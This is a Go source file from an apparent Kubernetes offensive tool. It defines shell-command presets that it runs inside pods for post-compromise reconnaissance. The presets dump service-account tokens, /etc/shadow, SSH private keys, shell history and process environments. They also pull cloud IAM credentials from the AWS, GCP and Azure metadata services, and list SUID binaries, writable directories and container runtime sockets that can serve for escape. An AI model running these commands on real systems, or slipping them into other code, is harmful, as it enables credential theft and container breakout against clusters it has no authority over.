package kube

import (
	"context"
	"fmt"
	"sort"
)

type ReconPreset struct {
	Key         string `json:"key"`
	Label       string `json:"label"`
	Category    string `json:"category"`
	Description string `json:"description"`
}

var reconShellCmds = map[string]string{
	"sa-token":     "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
	"sa-namespace": "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
	"sa-ca":        "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
	"shadow":       "cat /etc/shadow 2>&1",
	"passwd":       "cat /etc/passwd",
	"cgroup":       "cat /proc/self/cgroup; echo ---; cat /proc/1/cgroup 2>/dev/null",
	"mounts":       "cat /proc/self/mounts",
	"resolv":       "cat /etc/resolv.conf; echo ---; cat /etc/nsswitch.conf 2>/dev/null",
	"env":          "echo '--- /proc/self/environ ---'; tr '\\0' '\\n' </proc/self/environ; echo; echo '--- /proc/1/environ ---'; tr '\\0' '\\n' </proc/1/environ 2>/dev/null",
	"capabilities": "echo '--- /proc/self/status (Cap*/Seccomp/NoNewPrivs) ---'; grep -E 'Cap|NoNewPrivs|Seccomp' /proc/self/status; echo; (capsh --print 2>/dev/null || true)",
	"ssh-keys":     "ls -la /root/.ssh /home/*/.ssh 2>/dev/null; echo '--- authorized_keys ---'; cat /root/.ssh/authorized_keys 2>/dev/null; cat /home/*/.ssh/authorized_keys 2>/dev/null; echo '--- private keys ---'; cat /root/.ssh/id_* 2>/dev/null; cat /home/*/.ssh/id_* 2>/dev/null",
	"history":      "for f in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do echo \"--- $f ---\"; cat \"$f\" 2>/dev/null; done",
	"kubeenv":      "env | grep -iE 'KUBE|SERVICE|HOST' | sort",
	"imds-aws":     "curl -sm 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo; curl -sm 3 -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' -X PUT http://169.254.169.254/latest/api/token 2>/dev/null",
	"imds-gcp":     "curl -sm 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/?recursive=true' 2>/dev/null",
	"imds-azure":   "curl -sm 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null",
	"writable":     "find / -writable -type d -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' 2>/dev/null | head -50",
	"suid":         "find / -perm -4000 -type f 2>/dev/null | head -50",
	"docker-sock":  "ls -la /var/run/docker.sock /var/run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null; echo '--- hosts ---'; cat /etc/hosts",
	"network":      "ip a 2>/dev/null || ifconfig -a 2>/dev/null; echo ---; ip r 2>/dev/null || route -n 2>/dev/null; echo ---; ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
}

var reconCatalog = []ReconPreset{
	{"sa-token", "ServiceAccount Token", "k8s", "/var/run/secrets/.../token"},
	{"sa-namespace", "SA Namespace", "k8s", "当前 SA 所属 namespace"},
	{"sa-ca", "SA CA Bundle", "k8s", "apiserver CA"},
	{"kubeenv", "Kube 环境变量", "k8s", "KUBERNETES_/SERVICE_/HOST_ 相关 env"},
	{"shadow", "/etc/shadow", "host", "passwd 哈希（一般需 root）"},
	{"passwd", "/etc/passwd", "host", "本地用户"},
	{"cgroup", "/proc/.../cgroup", "host", "容器/cgroup 路径，含 container id"},
	{"mounts", "/proc/.../mounts", "host", "挂载点；找 hostPath、host root、docker.sock"},
	{"resolv", "/etc/resolv.conf", "host", "DNS server / 搜索域"},
	{"env", "Process Environ", "host", "self + PID 1 环境变量"},
	{"capabilities", "Capabilities/Seccomp", "host", "权限位、Seccomp、NoNewPrivs"},
	{"ssh-keys", "SSH Keys", "host", "authorized_keys + 私钥"},
	{"history", "Shell History", "host", "bash/zsh 历史"},
	{"network", "Network Info", "host", "网卡 / 路由 / 监听端口"},
	{"docker-sock", "Runtime Socket", "host", "docker/containerd/crio sock 可达性"},
	{"writable", "Writable Dirs", "host", "全局可写目录（限 50）"},
	{"suid", "SUID Files", "host", "SUID 二进制（限 50）"},
	{"imds-aws", "IMDS — AWS", "cloud", "EC2 metadata"},
	{"imds-gcp", "IMDS — GCP", "cloud", "GCE metadata (recursive)"},
	{"imds-azure", "IMDS — Azure", "cloud", "Azure IMDS"},
}

func (c *Client) ReconRead(ctx context.Context, ns, pod, container, preset string) (string, error) {
	cmd, ok := reconShellCmds[preset]
	if !ok {
		return "", fmt.Errorf("unknown preset: %s", preset)
	}
	out, stderr, err := c.ExecSimple(ctx, ns, pod, container, []string{"sh", "-c", cmd})
	combined := string(out)
	if len(stderr) > 0 {
		if combined != "" && combined[len(combined)-1] != '\n' {
			combined += "\n"
		}
		combined += "--- stderr ---\n" + string(stderr)
	}
	if err != nil {
		return combined, err
	}
	return combined, nil
}

func ReconCatalog() []ReconPreset {
	out := make([]ReconPreset, len(reconCatalog))
	copy(out, reconCatalog)
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].Category != out[j].Category {
			return out[i].Category < out[j].Category
		}
		return out[i].Label < out[j].Label
	})
	return out
}
